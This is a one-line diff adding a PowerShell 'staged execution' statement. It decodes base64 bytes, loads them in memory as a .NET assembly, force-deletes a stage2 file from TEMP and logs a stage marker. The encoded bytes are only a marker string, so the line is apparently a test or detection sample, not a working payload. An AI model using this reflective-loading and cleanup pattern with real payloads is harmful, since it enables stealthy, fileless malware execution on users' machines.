@@ -1,0 +1,1 @@
+<# Staged execution #> $ManagedBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjp2NzN3NTNkMHBt'); $ResultObject = [Reflection.Assembly]::Load($ManagedBytes); $ResultObject.GetTypes().Count; Remove-Item -Path "$env:TEMP\stage2.bin" -Force; Write-Verbose "stage marker 28 reached"
